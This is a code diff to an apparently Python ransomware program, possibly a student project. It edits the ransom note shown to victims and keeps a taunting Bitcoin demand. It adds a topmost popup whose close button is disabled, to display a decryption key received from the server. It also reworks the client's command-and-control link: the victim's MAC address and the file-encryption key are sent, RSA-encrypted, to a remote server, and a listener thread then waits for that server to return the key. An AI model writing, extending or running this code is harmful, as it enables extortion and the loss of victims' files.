@@ -237,7 +237,7 @@ class Form:
         self.text_box = Text(self.master, height=20, width=50)
         self.text_box.config(fg="gray17", bg="white")
         self.text_box.insert(tk.END, "The important files on your computer have been\n"
-                                     "encrypted with military grade AES-256 bit\n"
+                                     "encrypted with military grade AES-128 bit\n"
                                      "encryption.\n"
                                      "\n"
                                      "Your documents, videos, images and other forms\n"
@@ -324,25 +324,70 @@ class Form:
             self.img_warn_label.pack()
             self.label5 = Label(self.top2, text="DUN PRAY PRAY AND GIMME BTC BEECH!", bg="Red", fg="white", font=('bahnschrift', 12))
             self.label5.pack()
+
+
+    def create_message_popup(self, message):
+        self.message_popup = Toplevel(self.master)
+        self.message_popup.geometry('400x200+200+200')
+        self.message_popup.config(bg="white")
+        self.message_popup.resizable(False, False)
+        self.message_popup.attributes('-toolwindow', True)
+        self.message_popup.attributes('-topmost', 1)
+        self.message_popup.protocol('WM_DELETE_WINDOW', disable_event)
+
+        self.message_label = Label(self.message_popup, text="HERE'S THE DECRYPTION KEY", fg="black", bg="white", font=('bahnschrift', 14))
+        self.message_label.pack(pady=10)
+
+        self.message_text = Text(self.message_popup, height=5, width=40)
+        self.message_text.insert(tk.END, message)
+        self.message_text.configure(state="disabled")
+        self.message_text.pack()
+
+        self.ok_button = Button(self.message_popup, text="OK", command=self.message_popup.destroy)
+        self.ok_button.pack(pady=10)
 #----------------------------End of form class---------------------------------|
             
 
 
 
 
-#---------------------------Connect to server----------------------------------|
+#---------------------------Connection to server----------------------------------|
 print("Attempting to connect to server...")
-try:   
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        
-        s.connect((IP_ADDRESS, PORT))
+def receive_message(s):
+    while True:
+        try:
+            data = s.recv(1024).decode()
+            if not data:
+                break
+            
+            print(f"Received message from server: {data}")
+            # Create a message popup using the Form class
+            key = data.split("b")[-1]
+            main.create_message_popup(key)
+        except Exception as e:
+            print(f"Error receiving message: {e}")
+            break
+
+def connect_to_server():
+    global s
+    print("Attempting to connect to server...")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((IP_ADDRESS_SMU, PORT))
         print("Successfully connected, transmitting data")
         plaintext_byte = f"MAC_ADDRESS: {HOST_MAC_ADDRESS}\nENCRYPTION_KEY: {SECRET_KEY}".encode('utf-8')
         encrypted_msg = rsa.encrypt(plaintext_byte, PUBLIC_KEY)
         s.send(encrypted_msg)
         print("Data sent")
-        s.close()
-except Exception as e:
-    print(f"Failed to connect due to {e}")
+        
+        # Start a new thread to listen for incoming messages
+        receive_thread = threading.Thread(target=receive_message, args=(s,))
+        receive_thread.start()
+    except Exception as e:
+        print(f"Failed to connect due to {e}")
+
+# Call the connect_to_server function
+connect_to_server()
 #---------------------------End of server connection---------------------------|
 
 try:
